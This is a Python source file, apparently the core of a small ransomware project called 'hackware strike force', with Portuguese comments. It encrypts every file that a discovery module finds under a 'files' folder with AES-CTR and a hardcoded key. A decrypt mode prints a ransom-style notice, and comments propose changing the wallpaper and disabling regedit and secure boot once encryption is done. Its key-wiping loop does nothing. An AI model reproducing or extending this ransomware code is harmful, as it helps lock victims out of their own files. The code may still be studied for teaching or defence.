#!user/bin/python3.7
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

# ---------
# A senha pode ter o seguintes tamanhos
# 128/192/256 bits - 8 bits = 1 byte = uma letra unicode
# ---------
HARDCODED_KEY = 'hackware strike force strikes u!'


def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument('-d', '--decrypt',help='decripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
            HACKWARE STRIKE FORCE
            -----------------------------------------------
            Seus arquivos foram criptografados.
            Para decriptá-los utilize a seguinte senha '{}'
            '''.format(HARDCODED_KEY))
        key = input('Digite a sua senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key.encode("utf8"), AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [ init_path]

    for currentDir in startDirs:
        for filename in Discovery.discovery(currentDir):
            Crypter.change_files(filename, cryptFn)
    
    # limpa a chave de criptografia de memoria
    for _ in range(100):
        pass

    if not decrypt:
        # Codigo da zueira aqui
        pass
        # Após a encriptação, você pode alterar o wallpaper
        # Alterar  os icones, desativar o regedit, admin, bios secure boot, etc

if __name__ == '__main__':
    main()